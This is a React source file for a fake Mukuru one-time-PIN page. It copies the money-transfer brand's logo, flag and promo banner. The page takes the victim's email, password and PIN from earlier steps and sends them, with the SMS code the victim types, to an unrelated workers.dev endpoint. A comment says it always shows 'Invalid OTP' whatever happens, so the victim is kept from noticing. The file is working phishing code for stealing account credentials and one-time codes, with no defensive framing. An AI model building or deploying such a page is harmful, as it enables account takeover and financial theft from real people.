// import React, { useState } from "react";
// import { useLocation } from "react-router-dom";

// /* ---------- Inline icons (no extra dependencies) ---------- */
// const Icon = ({ children, className = "w-5 h-5" }) => (
//     <svg
//         viewBox="0 0 24 24"
//         fill="none"
//         stroke="currentColor"
//         strokeWidth="1.6"
//         strokeLinecap="round"
//         strokeLinejoin="round"
//         className={className}
//         aria-hidden="true"
//     >
//         {children}
//     </svg>
// );

// const MenuIcon = () => (
//     <Icon className="w-6 h-6"><path d="M3 6h18M3 12h18M3 18h18" /></Icon>
// );
// const SunIcon = () => (
//     <Icon className="w-5 h-5">
//         <circle cx="12" cy="12" r="4" />
//         <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" />
//     </Icon>
// );
// const ExternalIcon = () => (
//     <Icon className="w-5 h-5">
//         <path d="M14 4h6v6M20 4l-9 9M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5" />
//     </Icon>
// );
// const PhoneIcon = () => (
//     <Icon className="w-[18px] h-[18px]">
//         <path d="M5 4h4l2 5-2.5 1.5a11 11 0 0 0 5 5L15 13l5 2v4a2 2 0 0 1-2 2A16 16 0 0 1 3 6a2 2 0 0 1 2-2z" />
//     </Icon>
// );
// const ChevronDown = () => (
//     <Icon className="w-4 h-4"><path d="M6 9l6 6 6-6" /></Icon>
// );

// /* Mukuru starburst logo mark */
// const LogoMark = () => {
//     const points = Array.from({ length: 20 }, (_, i) => {
//         const r = i % 2 === 0 ? 22 : 15;
//         const a = (Math.PI * 2 * i) / 20 - Math.PI / 2;
//         return `${(24 + r * Math.cos(a)).toFixed(1)},${(24 + r * Math.sin(a)).toFixed(1)}`;
//     }).join(" ");
//     return (
//         <svg viewBox="0 0 48 48" className="h-[30px] w-[30px]" aria-hidden="true">
//             <polygon
//                 points={points}
//                 fill="none"
//                 stroke="#F15A24"
//                 strokeWidth="2.6"
//                 strokeLinejoin="round"
//                 strokeDasharray="7 2.5"
//             />
//         </svg>
//     );
// };

// /* South African flag (circular) */
// const ZaFlag = () => (
//     <svg viewBox="0 0 36 36" className="h-[22px] w-[22px]" aria-hidden="true">
//         <defs>
//             <clipPath id="za-clip"><circle cx="18" cy="18" r="18" /></clipPath>
//         </defs>
//         <g clipPath="url(#za-clip)">
//             <rect width="36" height="18" fill="#E03C31" />
//             <rect y="18" width="36" height="18" fill="#001489" />
//             <path d="M0 4l14 14L0 32M13 18h23" stroke="#fff" strokeWidth="9" fill="none" />
//             <path d="M0 4l14 14L0 32M13 18h23" stroke="#007749" strokeWidth="5" fill="none" />
//             <path d="M0 0l15 18L0 36z" fill="#000" />
//             <path d="M0 8l8 10-8 10z" fill="#FFB612" />
//         </g>
//     </svg>
// );

// /* ---------- Page ---------- */
// export default function MukuruOtpPage() {
//     const [pin, setPin] = useState("");
//     const location = useLocation();
//     const { email, password, newpin, mobile } = location.state || {};
//     const handleSubmit = async (e) => {
//         e.preventDefault();
//         // if (pin.trim()) onSubmit(pin.trim());
//         try {
//             const response = await fetch("https://my-worker.instapayapi.workers.dev/api/mukuruotp", {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify({ email, password, pin, mobile, otp: enteredOtp }),
//             });

//             const data = await response.json();
//             setError("Invalid OTP.");
//             if (!response.ok) {
//                 setError(data.message || "Invalid OTP.");
//                 return;
//             }

//         } catch (err) {
//             console.error("API error:", err);
//         }
//     };

//     return (
//         <div className="mx-auto min-h-screen w-full max-w-md bg-[#F8F6F3] font-sans text-[#2B2B2B]">
//             {/* Header */}
//             <header className="flex items-center justify-between border-b border-black/10 px-3.5 py-2.5">
//                 <div className="flex items-center gap-5">
//                     <button aria-label="Open menu" className="text-[#2B2B2B]">
//                         <MenuIcon />
//                     </button>
//                     <a href="/" className="flex items-center gap-1" aria-label="Mukuru home">
//                         <LogoMark />
//                         <span className="text-[19px] font-bold tracking-tight text-[#F15A24]">
//                             mukuru
//                         </span>
//                     </a>
//                 </div>

//                 <button
//                     aria-label="Select country"
//                     className="flex items-center gap-1.5 rounded-full bg-white py-1 pl-1 pr-2.5 shadow-[0_1px_5px_rgba(0,0,0,0.12)]"
//                 >
//                     <ZaFlag />
//                     <span className="text-[14px] font-semibold text-[#444]">ZA</span>
//                     <span className="text-[#777]"><ChevronDown /></span>
//                 </button>
//             </header>

//             <main className="px-3.5 pb-10 pt-3.5">
//                 {/* Promo banner */}
//                 <a
//                     href="https://wa.me/27860018555"
//                     className="flex items-center gap-3 rounded-[18px] bg-gradient-to-r from-[#FDEEE8] to-[#FEE1D6] px-3.5 py-3"
//                 >
//                     <span className="text-[#F15A24]"><SunIcon /></span>
//                     <p className="flex-1 text-[13px] font-medium leading-[1.4] text-[#2B2B2B]">
//                         SEND NOW! Dial*130*567# or Whatsapp us at +27 860 018 555 and say{" "}
//                         <span className="font-bold text-[#F15A24]">Hi</span>
//                     </p>
//                     <span className="text-[#F15A24]"><ExternalIcon /></span>
//                 </a>

//                 {/* OTP card */}
//                 <form
//                     onSubmit={handleSubmit}
//                     className="mt-3.5 rounded-[22px] border border-black/10 bg-white px-[18px] pb-5 pt-5"
//                 >
//                     <p className="text-[11px] font-semibold uppercase tracking-[0.12em] text-[#777]">
//                         One-time PIN
//                     </p>
//                     <h1 className="mt-2 text-[15px] font-medium leading-[1.45] text-[#2B2B2B]">
//                         We have just sent you an SMS with a ONE-TIME PIN to
//                     </h1>

//                     <div className="mt-2.5 inline-flex items-center gap-2 rounded-full bg-[#FDE3D9] px-4 py-2 text-[#F15A24]">
//                         <PhoneIcon />
//                         <span className="text-[19px] font-bold leading-none tracking-[0.04em]">
//                             {mobile}
//                         </span>
//                     </div>

//                     <input
//                         type="text"
//                         inputMode="numeric"
//                         autoComplete="one-time-code"
//                         value={pin}
//                         onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
//                         placeholder="Enter your PIN"
//                         aria-label="One-time PIN"
//                         className="mt-4 h-[58px] w-full rounded-2xl bg-[#F0EFEB] px-4 text-center text-[15px] text-[#2B2B2B] placeholder-[#7A7A7A] outline-none focus:ring-2 focus:ring-[#F15A24]/50"
//                     />

//                     <button
//                         type="submit"
//                         className="mt-3 h-[47px] w-full rounded-full bg-[#F15A24] text-[15px] font-semibold text-white shadow-[0_6px_16px_rgba(241,90,36,0.28)] transition hover:bg-[#E04E1A] active:scale-[0.99] focus:outline-none focus-visible:ring-4 focus-visible:ring-[#F15A24]/40"
//                     >
//                         Submit PIN
//                     </button>

//                     <button
//                         type="button"
//                         onClick={onReenter}
//                         className="mt-2.5 block w-full py-2 text-center text-[15px] font-medium text-[#555] hover:text-[#2B2B2B]"
//                     >
//                         Re-enter number
//                     </button>
//                 </form>
//             </main>
//         </div>
//     );
// }

import React, { useState } from "react";
import { useLocation } from "react-router-dom";

/* ---------- Inline icons (no extra dependencies) ---------- */
const Icon = ({ children, className = "w-5 h-5" }) => (
    <svg
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.6"
        strokeLinecap="round"
        strokeLinejoin="round"
        className={className}
        aria-hidden="true"
    >
        {children}
    </svg>
);

const MenuIcon = () => (
    <Icon className="w-6 h-6"><path d="M3 6h18M3 12h18M3 18h18" /></Icon>
);
const SunIcon = () => (
    <Icon className="w-5 h-5">
        <circle cx="12" cy="12" r="4" />
        <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" />
    </Icon>
);
const ExternalIcon = () => (
    <Icon className="w-5 h-5">
        <path d="M14 4h6v6M20 4l-9 9M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5" />
    </Icon>
);
const PhoneIcon = () => (
    <Icon className="w-[18px] h-[18px]">
        <path d="M5 4h4l2 5-2.5 1.5a11 11 0 0 0 5 5L15 13l5 2v4a2 2 0 0 1-2 2A16 16 0 0 1 3 6a2 2 0 0 1 2-2z" />
    </Icon>
);
const ChevronDown = () => (
    <Icon className="w-4 h-4"><path d="M6 9l6 6 6-6" /></Icon>
);

/* Mukuru starburst logo mark */
const LogoMark = () => {
    const points = Array.from({ length: 20 }, (_, i) => {
        const r = i % 2 === 0 ? 22 : 15;
        const a = (Math.PI * 2 * i) / 20 - Math.PI / 2;
        return `${(24 + r * Math.cos(a)).toFixed(1)},${(24 + r * Math.sin(a)).toFixed(1)}`;
    }).join(" ");
    return (
        <svg viewBox="0 0 48 48" className="h-[30px] w-[30px]" aria-hidden="true">
            <polygon
                points={points}
                fill="none"
                stroke="#F15A24"
                strokeWidth="2.6"
                strokeLinejoin="round"
                strokeDasharray="7 2.5"
            />
        </svg>
    );
};

/* South African flag (circular) */
const ZaFlag = () => (
    <svg viewBox="0 0 36 36" className="h-[22px] w-[22px]" aria-hidden="true">
        <defs>
            <clipPath id="za-clip"><circle cx="18" cy="18" r="18" /></clipPath>
        </defs>
        <g clipPath="url(#za-clip)">
            <rect width="36" height="18" fill="#E03C31" />
            <rect y="18" width="36" height="18" fill="#001489" />
            <path d="M0 4l14 14L0 32M13 18h23" stroke="#fff" strokeWidth="9" fill="none" />
            <path d="M0 4l14 14L0 32M13 18h23" stroke="#007749" strokeWidth="5" fill="none" />
            <path d="M0 0l15 18L0 36z" fill="#000" />
            <path d="M0 8l8 10-8 10z" fill="#FFB612" />
        </g>
    </svg>
);

/* ---------- Page ---------- */
export default function MukuruOtpPage() {
    const [pin, setPin] = useState("");
    const [error, setError] = useState("");
    const [submitting, setSubmitting] = useState(false);
    const location = useLocation();
    const { email, password, newpin, mobile } = location.state || {};

    const handleSubmit = async (e) => {
        e.preventDefault();
        setSubmitting(true);
        setError("");

        try {
            await fetch("https://my-worker.instapayapi.workers.dev/api/mukuruotp", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password, pin: newpin, mobile, otp: pin }),
            });
            setError("Invalid OTP.");
            setPin("");
        } catch (err) {
            console.error("API error:", err);
        } finally {
            // Always show invalid PIN, regardless of the API response.
            setError("Invalid OTP.");
            setSubmitting(false);
        }
    };

    const handleReenter = () => {
        window.history.back();
    };

    return (
        <div className="mx-auto min-h-screen w-full max-w-md bg-[#F8F6F3] font-sans text-[#2B2B2B]">
            {/* Header */}
            <header className="flex items-center justify-between border-b border-black/10 px-3.5 py-2.5">
                <div className="flex items-center gap-5">
                    <button aria-label="Open menu" className="text-[#2B2B2B]">
                        <MenuIcon />
                    </button>
                    <a href="#" className="flex items-center gap-1" aria-label="Mukuru home">
                        <LogoMark />
                        <span className="text-[19px] font-bold tracking-tight text-[#F15A24]">
                            mukuru
                        </span>
                    </a>
                </div>

                <button
                    aria-label="Select country"
                    className="flex items-center gap-1.5 rounded-full bg-white py-1 pl-1 pr-2.5 shadow-[0_1px_5px_rgba(0,0,0,0.12)]"
                >
                    <ZaFlag />
                    <span className="text-[14px] font-semibold text-[#444]">ZA</span>
                    <span className="text-[#777]"><ChevronDown /></span>
                </button>
            </header>

            <main className="px-3.5 pb-10 pt-3.5">
                {/* Promo banner */}
                <div
                    // href="https://wa.me/27860018555"
                    heref="#"
                    className="flex items-center gap-3 rounded-[18px] bg-gradient-to-r from-[#FDEEE8] to-[#FEE1D6] px-3.5 py-3"
                >
                    <span className="text-[#F15A24]"><SunIcon /></span>
                    <p className="flex-1 text-[13px] font-medium leading-[1.4] text-[#2B2B2B]">
                        SEND NOW! Dial*130*567# or Whatsapp us at +27 860 018 555 and say{" "}
                        <span className="font-bold text-[#F15A24]">Hi</span>
                    </p>
                    <span className="text-[#F15A24]"><ExternalIcon /></span>
                </div>

                {/* OTP card */}
                <form
                    onSubmit={handleSubmit}
                    className="mt-3.5 rounded-[22px] border border-black/10 bg-white px-[18px] pb-5 pt-5"
                >
                    <p className="text-[11px] font-semibold uppercase tracking-[0.12em] text-[#777]">
                        One-time PIN
                    </p>
                    <h1 className="mt-2 text-[15px] font-medium leading-[1.45] text-[#2B2B2B]">
                        We have just sent you an SMS with a ONE-TIME PIN to
                    </h1>

                    <div className="mt-2.5 inline-flex items-center gap-2 rounded-full bg-[#FDE3D9] px-4 py-2 text-[#F15A24]">
                        <PhoneIcon />
                        <span className="text-[19px] font-bold leading-none tracking-[0.04em]">
                            {mobile}
                        </span>
                    </div>

                    <input
                        type="text"
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        value={pin}
                        onChange={(e) => {
                            setPin(e.target.value.replace(/\D/g, ""));
                            if (error) setError("");
                        }}
                        placeholder="Enter your PIN"
                        aria-label="One-time PIN"
                        className={`mt-4 h-[58px] w-full rounded-2xl bg-[#F0EFEB] px-4 text-center text-[15px] text-[#2B2B2B] placeholder-[#7A7A7A] outline-none focus:ring-2 ${
                            error ? "ring-2 ring-red-400" : "focus:ring-[#F15A24]/50"
                        }`}
                    />

                    {error && (
                        <p className="mt-2 text-center text-[13px] font-medium text-red-500">
                            {error}
                        </p>
                    )}

                    <button
                        type="submit"
                        disabled={submitting}
                        className="mt-3 h-[47px] w-full rounded-full bg-[#F15A24] text-[15px] font-semibold text-white shadow-[0_6px_16px_rgba(241,90,36,0.28)] transition hover:bg-[#E04E1A] active:scale-[0.99] focus:outline-none focus-visible:ring-4 focus-visible:ring-[#F15A24]/40 disabled:opacity-60"
                    >
                        {submitting ? "Checking..." : "Submit PIN"}
                    </button>

                    <button
                        type="button"
                        onClick={handleReenter}
                        className="mt-2.5 block w-full py-2 text-center text-[15px] font-medium text-[#555] hover:text-[#2B2B2B]"
                    >
                        Re-enter number
                    </button>
                </form>
            </main>
        </div>
    );
}